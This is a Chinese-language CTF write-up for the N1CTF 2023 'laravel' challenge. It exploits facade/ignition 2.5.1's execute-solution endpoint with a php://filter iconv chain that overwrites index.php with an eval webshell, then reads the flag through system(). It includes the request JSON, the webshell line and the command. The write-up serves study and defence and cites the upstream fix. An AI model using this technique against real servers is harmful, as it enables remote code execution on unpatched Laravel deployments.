# N1CTF 2023 laravel

## 题目简述

环境使用 Laravel 8.4.2 与 `facade/ignition` 2.5.1，并开放 Ignition 的 `/_ignition/execute-solution` 接口。目标类 `Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution` 会读取用户指定的视图文件、修改内容后再写回。2.5.1 尚未限制 `viewFile` 必须是本地 Blade 模板，因此可以把 PHP stream wrapper 作为文件路径，最终覆盖 Web 入口并执行任意 PHP 代码。

题目环境不采用常见的 PHAR 日志反序列化链，核心是用 `php://filter` 直接构造可执行文件内容。

## 解题过程

### 确认任意文件读写入口

向接口提交如下结构即可调用目标 solution：

```json
{
  "solution": "Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution",
  "parameters": {
    "variableName": "x",
    "viewFile": "<可控路径>"
  }
}
```

漏洞版本会对 `viewFile` 执行 `file_get_contents()`，随后把处理结果交给 `file_put_contents()` 写回。官方修复在 2.5.2 中加入了安全路径检查：路径必须以 `/` 或 `./` 开头、以 `.blade.php` 结尾，并拒绝 wrapper 等非预期路径。修复差异可见 [facade/ignition PR #334](https://github.com/facade/ignition/pull/334)。

### 用 iconv 过滤链生成 PHP 文件

目标内容可以保持很短：

```php
<?php eval($_GET[1]);?>a
```

先对目标字节做 Base64 编码，再从末尾向前为每个字符选择一组 `convert.iconv.*` 转换。每轮通过 `convert.base64-decode` 与 `convert.base64-encode` 清理无关字节，并用 UTF-7 转换消除 Base64 填充符 `=`。最终得到形如下面的过滤链：

```text
php://filter/
convert.iconv.UTF8.CSISO2022KR|
...按目标字符逆序拼接的 iconv 过滤器...|
convert.base64-decode/
resource=/laravel/public/index.php
```

完整字典和生成方法可由 [PHP_INCLUDE_TO_SHELL_CHAR_DICT](https://github.com/wupco/PHP_INCLUDE_TO_SHELL_CHAR_DICT) 复现。它的关键作用不是简单编码已有文件，而是利用不同字符集转换时产生的固定前缀，逐字构造目标 Base64 文本；因此原文件内容不会妨碍得到预期的 PHP 载荷。

把生成的链放入 `viewFile` 并调用 `execute-solution`。Ignition 读取过滤后的内容，再通过同一可控路径完成写回，最终将 `/laravel/public/index.php` 改造成一句话执行入口。

### 执行命令

覆盖成功后访问首页，把系统命令放入参数 `1`：

```text
/?1=system('cat /flag');
```

实际请求时对括号、引号和空格进行 URL 编码，即可在响应中读出 flag。

## 方法总结

本题与 CVE-2021-3129 的入口相同，但利用目标不同：不是依赖 Laravel 日志与 PHAR 反序列化，而是利用未校验的 `viewFile` 和 `php://filter` 完成任意内容写入。分析这类框架漏洞时，应把“可控类名与参数”“危险文件 API”“路径校验”和“目标环境可用的 stream filter”分别确认，不能看到 Ignition 版本后机械套用单一公开利用链。
